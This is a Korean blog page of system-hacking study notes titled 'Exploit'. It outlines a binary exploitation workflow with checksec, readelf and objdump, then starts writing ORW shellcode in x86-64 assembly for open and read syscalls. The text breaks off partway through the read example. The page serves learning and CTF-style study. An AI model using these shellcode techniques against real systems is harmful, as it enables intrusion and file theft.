<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Exploit | AswinBlue</title><meta name=keywords content="C,hacking,assembly"><meta name=description content="Exploit pwntoolì˜ checksec ëª…ë ¹ì–´ë¡œ ì–´ë–¤ ë³´ì•ˆì´ ì ìš©ë˜ì—ˆëŠ”ì§€ í™•ì¸ ê°€ëŠ¥í•˜ë‹¤. Shell Code exploitì€ íŒŒì¼ ì½ê³  ì“°ê¸°(open-read-write, orw), ì…¸ ëª…ë ¹ ì‹¤í–‰(execve) ê¶Œí•œì„ ì·¨ë“í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•œë‹¤. Shell ê¶Œí•œì„ íšë“í•˜ê¸° ìœ„í•œ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë“¤ì˜ ëª¨ìŒì„ &lsquo;Shell Code&rsquo; ë¼ ì¹­í•œë‹¤. ì·¨ì•½ì  ê³µê²© ìˆœì„œ ë°”ì´ë„ˆë¦¬ë¥¼ ë¶„ì„í•˜ì—¬ ë³´í˜¸ê¸°ë²•ì„ í™•ì¸í•œë‹¤. checksec ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°”ì´ë„ˆë¦¬ì— ì ìš©ëœ ë³´í˜¸ê¸°ë²•ì„ í™•ì¸í•˜ê³ , ì ìš© ë¶ˆê°€ëŠ¥í•œ exploit ê¸°ë²•ì„ ì¶”ë ¤ë‚¸ë‹¤. checksec ì°¸ì¡° ì½”ë“œë¥¼ í™•ì¸í•˜ì—¬ ì·¨ì•½ì  ë° êµ¬ì¡°(stack í˜•íƒœ)ì„ íŒŒì•…í•œë‹¤ stackì€ í•¨ìˆ˜ì—ì„œ ì„ ì–¸ëœ ìˆœì„œëŒ€ë¡œ í• ë‹¹ë˜ì§€ ì•ŠìŒì— ì£¼ì˜í•˜ë©°, ë¬´ì¡°ê±´ assemblyì–´ë¥¼ í†µí•´ stack ì£¼ì†Œì—ì„œ íŠ¹ì • ë³€ìˆ˜ì˜ ìœ„ì¹˜ë¥¼ í™•ì¸í•˜ë„ë¡ í•œë‹¤."><meta name=author content="AswinBlue"><link rel=canonical href=https://aswinblue.github.io/Blog/post/systemhacking/exploit/><meta name=google-site-verification content="XYZabc"><link crossorigin=anonymous href=/Blog/assets/css/stylesheet.min.f92d651568443750d127ad6450a5621c2bf278d2c45216a3d199fd40eafc2473.css integrity="sha256-+S1lFWhEN1DRJ61kUKViHCvyeNLEUhaj0Zn9QOr8JHM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/Blog/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js integrity="sha256-uVus3DnjejMqn4g7Hni+Srwf3KK8HyZB9V4809q9TWE=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://aswinblue.github.io/Blog accesskey=h title="AswinBlue (Alt + H)">AswinBlue</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://aswinblue.github.io/Blog/archives title=Archive><span>Archive</span></a></li><li><a href=https://aswinblue.github.io/Blog/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://aswinblue.github.io/Blog/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://aswinblue.github.io/Blog/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><div class=grid-container><div style=float:left;margin:30px class=auto-hide-div><ul><li style=list-style-position:inside;text-indent:20px;color:#1284ff><a href=/Blog/post/systemhacking/>System Hacking</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/systemhacking/reverse_engineering/>Reverse Engineering</a></li><li style=list-style-position:inside;text-indent:30px;color:#1284ff;content:\25ba\00a0><a href=/Blog/post/systemhacking/exploit/>Exploit</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/systemhacking/pwntool/>Pwntool</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/assembly/>Assembly</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/assembly/assembly_basic/>Assembly_basic</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/projects/>ğŸ”·Projects</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/projects/delver/delver/>Delver</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/projects/flickthrough/flick_through/>FlickThrough</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/windowapp/>WindowApp</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/windowapp/window_programming/>Window_programming</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/windowapp/kivy/>Kivy</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/webserver/>WebServer</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webserver/spring_boot/>Spring_boot</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webserver/spring/>Spring basic</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webserver/nodejs/>Nodejs</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/webapplication/>WebApplication</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/thymeleaf/>thymeleaf</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/tailwind/>Tailwind</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/angular/>Angular</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/react_basic/>React basic</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/pythoncgi/>PythonCGI</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/javascript/>JavaScript</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/css/>Css</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/webapplication/html/>Html</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/python/>Python</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/python/python/>Python</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/mobileapp/>MobileApp</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/mobileapp/flutter/>Flutter</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/machinelearning/>MachineLearning</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/machinelearning/tensorflow/>Tensorflow</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/java/>Java</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/java/jython/>Jython</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/linux/>Linux</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/ipc/>IPC</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/thread/>Thread</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/process/>Process</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/system_programming/>System_programming</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/shell_programming/>Shell Programming</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/linux_introduction/>Linux_introduction</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/linux_env/>Linux_env</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/virtual_box/>Virtual_box</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/linux_command/>Linux commands</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/linux/linux_apt/>Linux_apt</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/hugo/>Hugo</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/hugo/hugo_dev/>Hugo í™˜ê²½ì„¸íŒ…</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/hugo/sample/>Markdown Syntax Guide</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/golang/>GoLang</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/golang/golang/>Golang</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/git/>Git</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/git/git/>Git</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/developtips/>DevelopTips</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/developtips/vscode/>VsCode</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/developtips/window/>Window</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/developtips/web_scrapping/>Web_scrapping</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/database/>DataBase</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/database/firebase_react/>Firebase_react</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/database/firebase/>Firebase</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/database/mysql/>Mysql</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/crypto/>Crypto</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/crypto/cryptocurrency/>Cryptocurrency</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/computerscience/>ComputerScience</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/computerscience/computer_science/>Computer Science</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/cloud/>Cloud</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/cloud/aws/>Aws</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/ci_cd/>CI_CD</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/ci_cd/docker/>Docker</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/algorithm/>Algorithm</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/algorithm/algorithm/>Algorithm</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=/Blog/post/c++/>C++</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/make/>Make</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/gcc/>Gcc</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/c++_stl/>C++_stl</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/gdb/>GDB</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/c++/>C++ basic</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/cmake/>CMake</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/json_c++/>Json in C++</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=/Blog/post/c++/log_c++/>spdlog C++</a></li></ul></li><ul></ul><ul></ul></ul></div><main class=main style=grid-row:1;grid-column:2;width:100%><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://aswinblue.github.io/Blog>Home</a></div><h1 class=post-title>Exploit</h1><div class=post-meta><span title='2024-03-11 20:46:33 +0900 KST'>March 11, 2024</span>&nbsp;Â·&nbsp;48 min&nbsp;Â·&nbsp;AswinBlue&nbsp;|&nbsp;<a href=https://github.com/AswinBlue/HugoBlog/tree/master/content/post/SystemHacking/exploit.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#exploit aria-label=Exploit>Exploit</a><ul><li><a href=#shell-code aria-label="Shell Code">Shell Code</a></li><li><a href=#%ec%b7%a8%ec%95%bd%ec%a0%90-%ea%b3%b5%ea%b2%a9-%ec%88%9c%ec%84%9c aria-label="ì·¨ì•½ì  ê³µê²© ìˆœì„œ">ì·¨ì•½ì  ê³µê²© ìˆœì„œ</a></li><li><a href=#%ec%b7%a8%ec%95%bd%ec%a0%90-%eb%b0%8f-%ea%b3%b5%eb%9e%b5 aria-label="ì·¨ì•½ì  ë° ê³µëµ">ì·¨ì•½ì  ë° ê³µëµ</a><ul><li><a href=#orw aria-label=ORW>ORW</a></li><li><a href=#execve aria-label=execve>execve</a></li><li><a href=#buffer-overflow aria-label="buffer overflow">buffer overflow</a></li><li><a href=#ropreturn-oriented-programming aria-label="ROP(Return Oriented Programming)">ROP(Return Oriented Programming)</a><ul><li><a href=#return-to-shellcode aria-label="Return to Shellcode">Return to Shellcode</a></li><li><a href=#return-to-library aria-label="Return To Library">Return To Library</a></li><li><a href=#return-to-plt aria-label="Return to PLT">Return to PLT</a></li><li><a href=#return-oriented-programming aria-label="Return Oriented Programming">Return Oriented Programming</a></li></ul></li><li><a href=#hook-overwrite aria-label="Hook Overwrite">Hook Overwrite</a><ul><li><a href=#free-hook-overload aria-label="Free Hook Overload">Free Hook Overload</a><ul><li><a href=#exploit-%ec%98%88%ec%8b%9c aria-label="exploit ì˜ˆì‹œ">exploit ì˜ˆì‹œ</a></li></ul></li></ul></li><li><a href=#out-of-bound aria-label="Out Of Bound">Out Of Bound</a></li><li><a href=#fsb-format-string-bug aria-label="FSB (Format String Bug)">FSB (Format String Bug)</a></li><li><a href=#use-after-free aria-label=Use-After-Free>Use-After-Free</a></li><li><a href=#doubly-free-bug aria-label="Doubly Free Bug">Doubly Free Bug</a><ul><li><a href=#tcache-poisoning aria-label="Tcache Poisoning">Tcache Poisoning</a></li></ul></li><li><a href=#logical-error aria-label="Logical Error">Logical Error</a><ul><li><a href=#type-error aria-label="Type Error">Type Error</a></li><li><a href=#command-injection aria-label="Command Injection">Command Injection</a></li><li><a href=#path-traversal aria-label="Path Traversal">Path Traversal</a></li></ul></li><li><a href=#bypass-seccomp aria-label="Bypass SECCOMP">Bypass SECCOMP</a><ul><li><a href=#exploit-%ec%98%88%ec%8b%9c-1 aria-label="exploit ì˜ˆì‹œ">exploit ì˜ˆì‹œ</a></li></ul></li><li><a href=#master-canary aria-label="Master Canary">Master Canary</a><ul><li><a href=#exploit-%ec%98%88%ec%8b%9c-2 aria-label="exploit ì˜ˆì‹œ">exploit ì˜ˆì‹œ</a></li></ul></li></ul></li><li><a href=#%eb%b3%b4%ed%98%b8-%ea%b8%b0%eb%b2%95 aria-label="ë³´í˜¸ ê¸°ë²•">ë³´í˜¸ ê¸°ë²•</a><ul><li><a href=#stack-canary aria-label="Stack Canary">Stack Canary</a></li><li><a href=#nx aria-label=NX>NX</a></li><li><a href=#aslr aria-label=ASLR>ASLR</a></li><li><a href=#pie aria-label=PIE>PIE</a></li><li><a href=#relro-relocation-read-only aria-label="RELRO (RELocation Read-Only)">RELRO (RELocation Read-Only)</a><ul><li><a href=#segment-%ea%b6%8c%ed%95%9c-%ed%99%95%ec%9d%b8-%eb%b0%a9%eb%b2%95 aria-label="segment ê¶Œí•œ í™•ì¸ ë°©ë²•">segment ê¶Œí•œ í™•ì¸ ë°©ë²•</a></li></ul></li><li><a href=#sandbox aria-label=Sandbox>Sandbox</a><ul><li><a href=#seccomp aria-label=SECCOMP>SECCOMP</a><ul><li><a href=#%ec%84%a4%ec%b9%98-%eb%b0%8f-%ec%82%ac%ec%9a%a9 aria-label="ì„¤ì¹˜ ë° ì‚¬ìš©">ì„¤ì¹˜ ë° ì‚¬ìš©</a></li><li><a href=#seccomp-tools aria-label=seccomp-tools>seccomp-tools</a></li></ul></li></ul></li></ul></li></ul></li></ul></div></details></div><div class=post-content><h1 id=exploit>Exploit<a hidden class=anchor aria-hidden=true href=#exploit>#</a></h1><ul><li><code>pwntool</code>ì˜ <code>checksec</code> ëª…ë ¹ì–´ë¡œ ì–´ë–¤ ë³´ì•ˆì´ ì ìš©ë˜ì—ˆëŠ”ì§€ í™•ì¸ ê°€ëŠ¥í•˜ë‹¤.</li></ul><h2 id=shell-code>Shell Code<a hidden class=anchor aria-hidden=true href=#shell-code>#</a></h2><ul><li>exploitì€ íŒŒì¼ ì½ê³  ì“°ê¸°(open-read-write, orw), ì…¸ ëª…ë ¹ ì‹¤í–‰(execve) ê¶Œí•œì„ ì·¨ë“í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•œë‹¤.</li><li>Shell ê¶Œí•œì„ íšë“í•˜ê¸° ìœ„í•œ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë“¤ì˜ ëª¨ìŒì„ &lsquo;Shell Code&rsquo; ë¼ ì¹­í•œë‹¤.</li></ul><h2 id=ì·¨ì•½ì -ê³µê²©-ìˆœì„œ>ì·¨ì•½ì  ê³µê²© ìˆœì„œ<a hidden class=anchor aria-hidden=true href=#ì·¨ì•½ì -ê³µê²©-ìˆœì„œ>#</a></h2><ol><li>ë°”ì´ë„ˆë¦¬ë¥¼ ë¶„ì„í•˜ì—¬ ë³´í˜¸ê¸°ë²•ì„ í™•ì¸í•œë‹¤.</li></ol><ul><li><code>checksec</code> ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°”ì´ë„ˆë¦¬ì— ì ìš©ëœ ë³´í˜¸ê¸°ë²•ì„ í™•ì¸í•˜ê³ , ì ìš© ë¶ˆê°€ëŠ¥í•œ exploit ê¸°ë²•ì„ ì¶”ë ¤ë‚¸ë‹¤.<ul><li><a href=../pwntool/#checksec>checksec ì°¸ì¡°</a></li></ul></li></ul><ol start=2><li>ì½”ë“œë¥¼ í™•ì¸í•˜ì—¬ ì·¨ì•½ì  ë° êµ¬ì¡°(stack í˜•íƒœ)ì„ íŒŒì•…í•œë‹¤</li></ol><ul><li><p>stackì€ í•¨ìˆ˜ì—ì„œ ì„ ì–¸ëœ ìˆœì„œëŒ€ë¡œ í• ë‹¹ë˜ì§€ ì•ŠìŒì— ì£¼ì˜í•˜ë©°, ë¬´ì¡°ê±´ assemblyì–´ë¥¼ í†µí•´ stack ì£¼ì†Œì—ì„œ íŠ¹ì • ë³€ìˆ˜ì˜ ìœ„ì¹˜ë¥¼ í™•ì¸í•˜ë„ë¡ í•œë‹¤.</p></li><li><p><code>readelf -h</code> ELF íŒŒì¼ì˜ í—¤ë” í™•ì¸</p></li><li><p><code>readelf -s</code> ELF íŒŒì¼ ë‚´ë¶€ symbol ì •ë³´ë“¤ì„ ì¶œë ¥</p><ul><li>í•¨ìˆ˜ ì£¼ì†Œ, ì´ë¦„ ë° ì†ì„±ë“¤ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul></li><li><p><code>readelf -S</code> ELF íŒŒì¼ ë‚´ë¶€ Section ì •ë³´ë“¤ì„ ì¶œë ¥</p><ul><li><code>objdump -h</code> ëª…ë ¹ê³¼ ë™ì¼í•œ ê²°ê³¼ë¥¼ ì¶œë ¥</li><li>sectionì˜ í¬ê¸°, VMA(Virtual Memory Address), LMA(Load Memory Address), file offset ë“±ì˜ ì •ë³´ë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul></li><li><p><code>objdump -S FILE_NAME</code>: object fileì„ ì–´ì…ˆë¸”ë¦¬ í˜•íƒœë¡œ ì£¼ì†Œë³„ë¡œ ì¶œë ¥</p></li><li><p><code>objdump -h FILE_NAME</code>: object fileì˜ section í—¤ë”ì •ë³´ë¥¼ í™•ì¸</p></li><li><p><code>objdump -d FILE_NAME</code>: object file ë‚´ìš©ì„ ì–´ì…ˆë¸”ë¦¬ì–´ í˜•íƒœë¡œ ì¶œë ¥í•œë‹¤.</p></li><li><p><code>objdump --disassemble=main</code> : main í•¨ìˆ˜ disassemble í™•ì¸</p><ul><li><code>gdb</code> ì‹¤í–‰ ì´í›„ <code>disass main</code> ìœ¼ë¡œë„ í™•ì¸ ê°€ëŠ¥</li></ul></li><li><p>í•¨ìˆ˜ì˜ ì¸ìì™€ ë ˆì§€ìŠ¤í„°</p><ul><li>í•¨ìˆ˜ì˜ ì¸ìëŠ” ìˆœì„œëŒ€ë¡œ rdi, rsi, rdx, rcx, r8, r9, [rsp], [rsp+8], [rsp+0x10], [rsp+0x18], [rsp+0x20] &mldr; ê°’ì„ ê°€ì ¸ì™€ì„œ ì‚¬ìš©í•œë‹¤.</li></ul></li></ul><ol start=3><li>í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰ì‹œí‚¤ë©° ì·¨ì•½ì  ê³µëµ ë° ì‰˜ ê¶Œí•œ íƒˆì·¨</li></ol><ul><li><a href=../pwntool>pwndbg</a> ë° <a href=../../C++/gdb>pwntool</a> í™œìš©</li></ul><h2 id=ì·¨ì•½ì -ë°-ê³µëµ>ì·¨ì•½ì  ë° ê³µëµ<a hidden class=anchor aria-hidden=true href=#ì·¨ì•½ì -ë°-ê³µëµ>#</a></h2><h3 id=orw>ORW<a hidden class=anchor aria-hidden=true href=#orw>#</a></h3><ul><li>íŒŒì¼ì„ ì—´ê³  ì½ê³  ì“¸ ìˆ˜ ìˆë„ë¡ í•˜ëŠ” shell codeë¥¼ &lsquo;ORW shell code&rsquo; ë¼ ì¹­í•œë‹¤.</li><li>ì‹œìŠ¤í…œ ì½œë“¤ì€ rax, rdi, rsi, rdxë¡œ ì´ë£¨ì–´ ì ¸ ìˆìŒì„ ì°¸ê³ í•˜ì—¬ shell codeë¥¼ ì‘ì„±í•´ ë³´ì.<ul><li>rax : ì‹œìŠ¤í…œ ì½œì— ëŒ€ì‘ë˜ëŠ” ë²ˆí˜¸</li><li>rdi : ì‹œìŠ¤í…œ ì½œì˜ ì²«ë²ˆì§¸ ì¸ì</li><li>rsi : ì‹œìŠ¤í…œ ì½œì˜ ë‘ë²ˆì§¸ ì¸ì</li><li>rdx : ì‹œìŠ¤í…œ ì½œì˜ ì„¸ë²ˆì§¸ ì¸ì</li></ul></li></ul><ol><li><p>open</p><ul><li>ë¦¬ëˆ…ìŠ¤ì—ì„œ open ëª…ë ¹ì€ <code>open('FILE_PATH', flag, mode)</code> í˜•íƒœì´ë‹¤.</li><li>ì´ë¥¼ ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ ë¶„ë¦¬í•˜ì—¬ í‘œí˜„í•˜ë©´<ol><li>&lsquo;FILE_PATH&rsquo; ì„ stackì— ë‹´ëŠ”ë‹¤.<ul><li>ì´ë•Œ, stackì—ëŠ” ë°ì´í„°ê°€ 8byteì”© ì˜¬ë¼ê°€ê¸° ë•Œë¬¸ì— 8byte ë‹¨ìœ„ë¡œ stringì„ ëŠì–´ì„œ pushí•œë‹¤.</li><li>ex) &ldquo;1234567890&rdquo; ì„ stackì— ë‹´ì„ ë•Œ &ldquo;09&rdquo; &ldquo;87654321&rdquo; ìˆœìœ¼ë¡œ ë°ì´í„°ë¥¼ pushí•´ì•¼ í•œë‹¤.</li></ul></li><li>rspë¥¼ rdië¡œ ì˜®ê²¨ rdi(ì²«ë²ˆì§¸ ì¸ì)ê°€ &lsquo;FILE_PATH&rsquo;ë¥¼ ê°€ë¦¬í‚¤ë„ë¡ í•œë‹¤.</li><li>ë‘ ë²ˆì§¸ì™€ ì„¸ ë²ˆì§¸ ì¸ìì— ë§ê²Œ ê°ê° rsiì™€ rdxë¥¼ ì„¤ì •í•œë‹¤.</li><li>openì€ ì‹œìŠ¤í…œ ì½œ ë²ˆí˜¸ 2ì— í•´ë‹¹í•˜ë¯€ë¡œ raxë¥¼ 2ë¡œ ì„¤ì •í•œë‹¤.</li></ol></li><li>ex) open (&ldquo;1234567890&rdquo;, O_RDONLY, NULL) ì€ ì•„ë˜ ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ ì¹˜í™˜ëœë‹¤.<pre tabindex=0><code>push 0x3039
mov rax, 0x3837363534333231 ; to push 8byte
push rax
mov rdi, rsp    ; (1) rdi = &#34;1234567890&#34;
xor rsi, rsi    ; (3) rsi = 0 ; O_RDONLY
xor rdx, rdx    ; (3) rdx = 0 ; NULL
mov rax, 2      ; (4) rax = 2 ; syscall_open
syscall         ; open(&#34;1234567890&#34;, O_RDONLY, NULL)
</code></pre></li></ul></li><li><p>read</p><ul><li>read ëª…ë ¹ì€ <code>read(FILE_DESCRIPTOR, buf, size)</code> í˜•íƒœì´ë‹¤.</li><li>read ëª…ë ¹ì„ ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ í‘œí˜„í•˜ë©´<ol><li>openì„ í†µí•´ ì—´ë¦° íŒŒì¼ì˜ file descriptorëŠ” <code>rax</code> ì˜ì—­ì— ì €ì¥ë˜ë¯€ë¡œ, <code>rax</code> ê°’ì„ <code>rdi</code> ì— ëŒ€ì…í•œë‹¤.</li><li>ë°ì´í„°ë¥¼ ì €ì¥í•  ê¸¸ì´ë¥¼ ê³ ë ¤í•˜ì—¬ <code>rsi</code>ì— ê°’ì„ ëŒ€ì…í•œë‹¤. sizeê°€ 10ì´ë¼ë©´ <code>rsp-10</code> ê°’ì„ ëŒ€ì…í•œë‹¤.</li><li><code>rdx</code> ì— size ê°’ì„ ëŒ€ì…í•œë‹¤.</li><li><code>rax</code> ì— readì— í•´ë‹¹í•˜ëŠ” 0 ê°’ì„ ëŒ€ì…í•œë‹¤.</li></ol></li><li>ex) read(fd, buf, 10) ì€ ì•„ë˜ ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ í‘œí˜„ëœë‹¤.<pre tabindex=0><code>mov rdi, rax      ; (1) fdê°’ì„ rdiì— ëŒ€ì…
mov rsi, rsp
sub rsi, 0x0A     ; (2) rsi = rsp-10 ; buf
mov rdx, 0x0A     ; (3) rdx = 0x0A     ; length
mov rax, 0x0      ; (4) rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x0A)
